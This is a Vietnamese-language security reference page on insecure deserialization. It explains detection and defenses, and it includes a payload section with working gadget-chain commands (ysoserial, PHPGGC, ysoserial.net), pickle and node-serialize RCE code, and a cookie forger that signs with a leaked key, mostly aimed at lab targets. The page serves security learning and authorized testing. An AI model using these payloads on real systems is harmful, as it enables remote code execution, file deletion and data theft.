# Insecure Deserialization

> Deserialize dữ liệu của kẻ tấn công khởi tạo các đối tượng nguy hiểm, thường là RCE. **Tài liệu chuyên sâu:** [`Troubleshooting_Guide/se_de.md`](../../../../Troubleshooting_Guide/se_de.md) · **Skill:** [`ai_framework/skills/`](../../../ai_framework/skills/README.md)

**Tên gọi khác / OWASP:** A08:2021 Software & Data Integrity Failures
**Ngôn ngữ:** [English](README.md) · Tiếng Việt
**Trạng thái:** hoàn chỉnh

## Là gì (What it is)
Insecure deserialization là khi một ứng dụng tái dựng các đối tượng từ dữ liệu được serialize mà kẻ tấn
công có thể kiểm soát mà không xác thực nó. Vì việc deserialize có thể khởi tạo các kiểu tùy ý và kích
hoạt các phương thức vòng đời của chúng, việc kiểm soát luồng byte có thể cho phép kẻ tấn công thao túng
logic ứng dụng hoặc chạy mã.

## Cơ chế hoạt động (How it works)
Ứng dụng nhận một blob đã serialize — thường là cookie phiên, trường form ẩn, hoặc một message — và
chuyển thẳng nó vào `unserialize()`, `ObjectInputStream.readObject()`, `pickle.loads()`, Ruby
`Marshal.load`, hoặc phân tích ViewState của `.NET`. Kẻ tấn công kiểm soát lớp của đối tượng và các giá
trị trường. Việc giả mạo lật các thuộc tính (ví dụ cờ `admin`) hoặc lạm dụng type juggling; khai thác
sâu hơn nối chuỗi các lớp có sẵn ("gadget") mà các phương thức `__destruct`/`readObject`/`__reduce__`
của chúng thực hiện các thao tác nguy hiểm, nên chỉ cần deserialize payload là đã thực thi logic của kẻ
tấn công.

## Tác động (Impact)
Tối thiểu là leo thang đặc quyền và vượt logic qua các thuộc tính bị giả mạo; tệ nhất là thực thi mã từ
xa hoàn toàn thông qua các chuỗi gadget (ysoserial, PHPGGC, ysoserial.net). Nó cũng có thể dẫn đến
đọc/ghi/xóa tệp tùy ý, SQL injection, và SSRF tùy thuộc vào các gadget có sẵn. Các trường hợp có khả
năng RCE là nghiêm trọng (critical).

## Cách phát hiện (How to detect)
- Nhận diện dữ liệu đã serialize qua chữ ký của nó: PHP `O:`/`a:`, Java `AC ED 00 05` / Base64 `rO0AB`,
  Python pickle `\x80`, Ruby Marshal `\x04\x08`, hoặc một trường `__VIEWSTATE`.
- Giả mạo tối thiểu (lật một byte, đổi một tiền tố độ dài) và quan sát các exception khi deserialize
  hoặc hành vi thay đổi.
- Đối với các trường hợp mù (blind), dùng một probe out-of-band an toàn (Java `URLDNS`, một gadget PHP
  `sleep`/ghi-tệp) và xác nhận qua callback DNS hoặc thời gian thay vì bắn RCE một cách mù quáng.

## Khai thác (tóm tắt) (Exploitation)
Một khi đã biết định dạng, chỉnh sửa các thuộc tính để vượt logic, hoặc tạo một payload chuỗi-gadget
bằng công cụ phù hợp và gửi nó thay cho blob hợp lệ. Các định dạng được ký/mã hóa (cookie Symfony,
ViewState của .NET) yêu cầu một bí mật/machine key bị rò rỉ, mà thường có thể khôi phục được qua lộ
thông tin. Các payload theo từng ngôn ngữ và quy trình mã hóa/giải mã cookie nằm trong phần Payload.

## Payload & kỹ thuật (Payloads & techniques)

> Chắt lọc từ các tài liệu payload thực chiến — chỉ dành cho kiểm thử được cấp phép.

### Phát hiện định dạng (Format detection)

| Định dạng | Magic byte / mẫu | Nơi xuất hiện |
|--------|----------------------|-------------------|
| PHP | `O:`, `a:`, `s:`, `i:`, `b:` trong chuỗi serialize | `PHPSESSID` / cookie phiên |
| Java | `AC ED 00 05` (raw), `rO0AB` (Base64) | `JSESSIONID` / cookie phiên |
| Ruby Marshal | `\x04\x08` | `_session_id` |
| Python Pickle | `\x80\x02`, `\x80\x04`, `\x80\x05` | cookie phiên |
| .NET ViewState | tham số form `__VIEWSTATE` | trường form ẩn |

### Giả mạo đối tượng PHP (PHP object tampering)

Lật một cờ admin trong một đối tượng phiên đã giải mã Base64/URL:
```text
# Original
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}
# Modified (b:0 → b:1)
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}
```
Quy trình trong Burp: giải mã cookie (URL → Base64), chỉnh sửa, mã hóa lại (Base64 → URL), rồi truy cập `/admin`.

Type juggling chống lại một phép so sánh lỏng lẻo `== 0` — tráo token thành số nguyên `0` (`"anything" == 0` là `TRUE` trong PHP); nhớ sửa tiền tố độ-dài-chuỗi:
```text
# username length 6 → 13, token type s → i, value → 0
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
```

Xóa tệp tùy ý qua một thuộc tính `avatar_link` trỏ tới một tệp nạn nhân, rồi `POST /my-account/delete`:
```text
O:4:"User":3:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}
```

### Tiêm magic-method / gadget của PHP (PHP magic-method / gadget injection)

Tiêm một đối tượng mà `__destruct`/`__wakeup` của nó thực hiện hành động nguy hiểm:
```text
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```
```bash
php -r 'echo base64_encode("O:14:\"CustomTemplate\":1:{s:14:\"lock_file_path\";s:23:\"/home/carlos/morale.txt\";}");'
```

Cookie Symfony được ký với một **khóa bí mật bị rò rỉ** (PHPGGC + HMAC). Rò rỉ khóa từ một trang debug, dựng gadget, rồi ký nó mà không cần PHP:
```bash
curl https://TARGET/cgi-bin/phpinfo.php | grep SECRET_KEY
./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64
```
```python
import hmac, hashlib, urllib.parse

secret_key = "LEAKED_KEY_HERE"
object_payload = "BASE64_PHPGGC_OUTPUT_HERE"

sig = hmac.new(secret_key.encode(), object_payload.encode(), hashlib.sha1).hexdigest()
cookie = urllib.parse.quote(f'{{"token":"{object_payload}","sig_hmac_sha1":"{sig}"}}')
print(cookie)
# curl -b "session=$cookie" https://TARGET/my-account
```

Deserialization PHAR — bất kỳ thao tác tệp nào trên một đường dẫn `phar://` đều deserialize metadata nhúng:
```bash
./phpggc Monolog/RCE1 system 'whoami' -p phar -o evil.jpg
# Trigger: GET /avatar.php?avatar=phar:///uploads/evil.jpg
# Needs phar.readonly = Off; sinks: file_exists, fopen, stat, file_get_contents, SplFileInfo
```

### Chuỗi gadget Java (Java gadget chains)

RCE Apache Commons Collections qua ysoserial (lưu ý các cờ `--add-opens` cho Java 16+):
```bash
# Java 16+
java \
  --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
  --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
  --add-opens=java.base/java.net=ALL-UNNAMED \
  --add-opens=java.base/java.util=ALL-UNNAMED \
  -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 -w 0

# Java 15 and below
java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 -w 0
```
```python
import subprocess, base64, requests, urllib.parse

ysoserial_cmd = ['java', '-jar', 'ysoserial-all.jar',
                 'CommonsCollections4', 'rm /home/carlos/morale.txt']
payload_bytes = subprocess.run(ysoserial_cmd, capture_output=True).stdout
encoded = urllib.parse.quote(base64.b64encode(payload_bytes).decode())
requests.get('https://TARGET/my-account', cookies={'session': encoded})
```

Chuỗi gadget tùy chỉnh — serialize lại một lớp ứng dụng (ví dụ `ProductTemplate`) với một chuỗi SQL-injection để chạm tới một sink truy vấn tại thời điểm deserialize:
```java
import java.io.*;
import java.util.Base64;

class ProductTemplate implements Serializable {
    private final String id;
    public ProductTemplate(String id) { this.id = id; }
}

public class GeneratePayload {
    public static void main(String[] args) throws Exception {
        String[] payloads = {
            "'",
            "' ORDER BY 8--",
            "' UNION SELECT NULL,NULL,NULL,CAST(password AS numeric),NULL,NULL,NULL,NULL FROM users--"
        };
        for (String payload : payloads) {
            ProductTemplate obj = new ProductTemplate(payload);
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(baos);
            oos.writeObject(obj);
            oos.close();
            System.out.println(Base64.getEncoder().encodeToString(baos.toByteArray()));
        }
    }
}
```
```bash
javac GeneratePayload.java && java GeneratePayload   # send Base64 output as session cookie
```

### RCE `node-serialize` của Node.js (Node.js `node-serialize` RCE)

Biểu thức hàm gọi-ngay-tức-thì trong marker `_$$ND_FUNC$$_` kích hoạt khi `deserialize()`:
```javascript
const payload = {
  rce: "_$$ND_FUNC$$_function(){require('child_process').exec('rm /home/carlos/morale.txt')}()",
};
const encoded = Buffer.from(JSON.stringify(payload)).toString("base64");
// Set as session cookie
```

### RCE Pickle của Python (Python Pickle RCE)

`__reduce__` trả về một callable + args được thực thi khi `pickle.loads()`:
```python
import pickle, os, base64

class MaliciousPayload:
    def __reduce__(self):
        return (os.system, ('rm /home/carlos/morale.txt',))

payload = base64.b64encode(pickle.dumps(MaliciousPayload())).decode()
print(f"Cookie: {payload}")

# Safe canary instead of os.system:
class SafeCanary:
    def __reduce__(self):
        return (print, ('DESERIALIZATION_EXECUTED',))
```

### ViewState của .NET (ysoserial.net) (.NET ViewState)

Với một MachineKey bị rò rỉ, giả mạo một `__VIEWSTATE` độc hại:
```bash
ysoserial.exe -p ViewState -g TextFormattingRunProperties \
  -c 'powershell whoami > C:\inetpub\wwwroot\out.txt' \
  --path=/default.aspx --apppath=/ \
  --decryptionalg=AES --decryptionkey=LEAKED_KEY \
  --validationalg=SHA1 --validationkey=LEAKED_KEY
```

### Phát hiện mù (không RCE) (Blind detection)

Java URLDNS — callback DNS xác nhận việc deserialize một cách an toàn:
```bash
java -jar ysoserial-all.jar URLDNS 'http://YOUR.burpcollaborator.net' | base64 -w 0
```
Các probe dựa-trên-thời-gian / dựa-trên-lỗi của PHP qua PHPGGC:
```bash
./phpggc Symfony/RCE3 sleep 5 -b | base64
./phpggc -b '<?php file_put_contents("/tmp/pwned","pwned"); ?>' > pwned.phar
```

### Quy trình mã hóa cookie (Cookie encoding workflow)

```text
PHP  serialize:   object → serialize() → base64 → URL-encode → cookie
PHP  deserialize: cookie → URL-decode → base64-decode → unserialize()
Java serialize:   object → java serialization → base64 → URL-encode → cookie
Java deserialize: cookie → URL-decode → base64-decode → ObjectInputStream.readObject()
```

## Phòng chống (Defenses)
1. **Không deserialize dữ liệu không tin cậy** — đây là cách khắc phục bền vững duy nhất. Dùng một định
   dạng dữ liệu phẳng (JSON/XML có schema) cho dữ liệu vượt ranh giới tin cậy và ánh xạ các trường một
   cách tường minh.
2. **Nếu không thể tránh serialization native**, hãy bắt buộc tính toàn vẹn: ký dữ liệu serialize bằng
   một khóa chỉ-máy-chủ-biết (HMAC) và xác minh trước khi deserialize, để các blob bị giả mạo bị từ chối.
3. **Hạn chế các kiểu** — dùng deserialize kiểu look-ahead/allow-list (Java `ObjectInputFilter`, .NET
   `SerializationBinder`) để chỉ các lớp dự kiến mới được khởi tạo; không bao giờ deserialize thành các kiểu tùy ý.
4. **Loại bỏ bề mặt gadget** — giữ các phụ thuộc được vá và loại bỏ các thư viện có chuỗi gadget đã biết
   (Commons Collections, v.v.); đặt `phar.readonly = On` trong PHP.
5. Bảo vệ các khóa ký/machine key và chạy với đặc quyền tối thiểu để một chuỗi thành công có bán kính ảnh hưởng hạn chế.

## Tìm CVE từ đầu (Finding CVEs from scratch)
- **NVD** — https://nvd.nist.gov/vuln/search?query=Insecure+Deserialization
- **CVE.org** — https://www.cve.org/CVERecord/SearchResults?query=Insecure+Deserialization
- **Exploit-DB** — https://www.exploit-db.com/search?q=Insecure+Deserialization
- **GitHub Advisories** — https://github.com/advisories?query=Insecure+Deserialization
- **OSV** — https://osv.dev/list?q=Insecure+Deserialization
- **Cộng đồng** — r/netsec, blog bảo mật của nhà cung cấp, HackerOne Hacktivity, X/Twitter infosec.
- _Mẹo tìm kiếm: thêm sản phẩm mục tiêu + phiên bản, ví dụ `Insecure Deserialization <product> <version>`._

## Các CVE tiêu biểu (Notable CVEs)
_Mang tính minh họa — hãy kiểm chứng lại trên NVD trước khi trích dẫn._
- `CVE-2015-7501` / `CVE-2015-4852` — Chuỗi gadget Apache Commons Collections; RCE deserialization Java
  lan tràn khắp JBoss, WebLogic, WebSphere, Jenkins (kỷ nguyên ysoserial).
- `CVE-2017-9805` — RCE deserialization XStream trong plugin REST của Apache Struts 2.
- `CVE-2020-2555` — RCE deserialization T3 của Oracle Coherence/WebLogic (lớp gadget WebLogic tái diễn).

## Tham khảo (References)
- PortSwigger Web Security Academy — Insecure deserialization.
- OWASP — Deserialization Cheat Sheet.
- OWASP Top 10 — A08:2021 Software and Data Integrity Failures.
